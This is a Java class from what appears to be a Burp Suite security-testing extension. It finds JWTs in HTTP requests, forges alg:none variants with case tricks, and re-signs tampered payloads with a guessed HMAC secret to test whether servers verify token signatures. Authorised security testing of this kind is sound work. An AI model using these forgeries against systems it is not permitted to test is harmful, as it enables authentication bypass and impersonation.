package com.victor.reconloop;

import burp.api.montoya.http.message.requests.HttpRequest;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Pure helpers for active JWT testing: find JWTs in a request and forge {@code alg:none} variants.
 * The forgeries are re-encoded tokens (header rewritten to alg:none, original payload, empty
 * signature) that a correctly-implemented server must reject; the controller replays them and
 * compares responses to decide whether signatures are actually verified. No network here.
 */
final class JwtAttackEngine {

    private static final Pattern JWT =
            Pattern.compile("eyJ[A-Za-z0-9_-]{5,}\\.[A-Za-z0-9_-]{5,}\\.[A-Za-z0-9_-]*");

    private static final Pattern ALG =
            Pattern.compile("(\"alg\"\\s*:\\s*\")([^\"]*)(\")");

    static Set<String> extractJwts(HttpRequest request) {
        LinkedHashSet<String> out = new LinkedHashSet<>();
        if (request == null) return out;
        Matcher m = JWT.matcher(request.toString());
        while (m.find()) {
            String token = m.group();
            if (token.split("\\.").length >= 2) out.add(token);
        }
        return out;
    }

    /** alg:none forgeries with an empty signature (case variants some libraries mishandle). */
    static List<String> forgeNoneVariants(String token) {
        List<String> out = new ArrayList<>();
        String[] parts = token.split("\\.");
        if (parts.length < 2) return out;
        String headerJson = decode(parts[0]);
        if (headerJson == null || !ALG.matcher(headerJson).find()) return out;
        for (String noneAlg : List.of("none", "None", "NONE", "nOnE")) {
            String rewritten = ALG.matcher(headerJson).replaceFirst("$1" + Matcher.quoteReplacement(noneAlg) + "$3");
            out.add(encode(rewritten) + "." + parts[1] + ".");
        }
        return out;
    }

    /** The (lower-cased) alg from the token header, or null. */
    static String headerAlg(String token) {
        String[] parts = token.split("\\.");
        if (parts.length < 2) return null;
        String header = decode(parts[0]);
        if (header == null) return null;
        Matcher m = Pattern.compile("\"alg\"\\s*:\\s*\"([^\"]*)\"").matcher(header);
        return m.find() ? m.group(1).toLowerCase(Locale.ROOT) : null;
    }

    /**
     * Re-signs the token with {@code secret} after injecting a benign marker claim, producing a token
     * the server never issued. If a server accepts it, arbitrary-claim forgery is proven. Returns the
     * forged token, or null if the alg isn't HMAC or signing fails.
     */
    static String forgeWithSecret(String token, String secret, String algLower) {
        String macAlg = switch (algLower == null ? "" : algLower) {
            case "hs256" -> "HmacSHA256";
            case "hs384" -> "HmacSHA384";
            case "hs512" -> "HmacSHA512";
            default -> null;
        };
        if (macAlg == null) return null;
        String[] parts = token.split("\\.");
        if (parts.length < 2) return null;
        String payload = decode(parts[1]);
        if (payload == null || !payload.trim().startsWith("{")) return null;
        // Inject a marker claim so the forged token differs from the original signature.
        String tampered = payload.trim().endsWith("}")
                ? payload.trim().substring(0, payload.trim().length() - 1)
                    + (payload.trim().length() > 2 ? "," : "") + "\"rh_forged\":1}"
                : payload;
        String signingInput = parts[0] + "." + encode(tampered);
        try {
            Mac mac = Mac.getInstance(macAlg);
            mac.init(new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), macAlg));
            String sig = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString(mac.doFinal(signingInput.getBytes(StandardCharsets.US_ASCII)));
            return signingInput + "." + sig;
        } catch (Exception e) {
            return null;
        }
    }

    private static String decode(String segment) {
        try {
            return new String(Base64.getUrlDecoder().decode(pad(segment)), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    private static String encode(String value) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(value.getBytes(StandardCharsets.UTF_8));
    }

    private static String pad(String value) {
        int mod = value.length() % 4;
        return mod == 0 ? value : value + "====".substring(mod);
    }
}
